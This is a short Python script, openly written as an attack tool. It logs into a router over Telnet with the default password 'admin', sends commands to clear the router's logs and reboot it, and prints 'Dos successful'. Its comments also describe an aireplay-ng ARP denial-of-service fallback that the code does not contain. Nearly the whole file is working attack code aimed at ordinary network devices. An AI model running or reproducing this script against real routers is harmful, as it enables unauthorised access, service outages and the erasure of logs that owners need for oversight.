from __future__ import print_function


import telnetlib
import sys
import logging
import os
# imports the loggign module, creates a logging file called "ProgramLog.txt"
logging.basicConfig(filename='_Spawn_Log.txt', level=logging.DEBUG,
					format=' %(asctime)s - %(levelname)s- %(message)s')

# -------------- #
HOST = "192.168.1.1"
PASSWORD = "admin"
DEVMODE = True
# -------------- #

"""
Connects to router via Telnet, logs in with default password
tells the router to clear all logs and reboot
if it cant connect, it'll use aireplay-ng to perform an ARP cache based DOS
on the router, it'll send 5 requests to the router and then stops.
This hackin process kills it self afterwards.
"""

if not DEVMODE:
	logging.disable(logging.CRITICAL)
# if DEVMODE is false, turn off debugging


class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'


def main():
	print(bcolors.OKGREEN + '[*]' + bcolors.ENDC + "Performing DOS attack")
	dos()
	close()


def dos():

	password = (PASSWORD.encode())
	try:
		logging.debug("connecting")
		tn = telnetlib.Telnet(HOST)
		logging.debug("connected")
		print(bcolors.OKGREEN + '[*]' + bcolors.ENDC + "Connected to Router")

	except Exception as e:
		close()

	logging.debug("conneted to router")

	tn.read_until("Password: ".encode())
	tn.write(password + "\n".encode())
	logging.debug("logged in")

	logging.debug("dossing")
	tn.write("sys log cleart\n".encode())
	tn.write("sys reboot\n".encode())
	print(bcolors.OKGREEN + '[*]' + bcolors.ENDC + "Dos successful")
	tn.close()
	close()


def close():
	sys.exit()

if __name__ == "__main__":
	main()
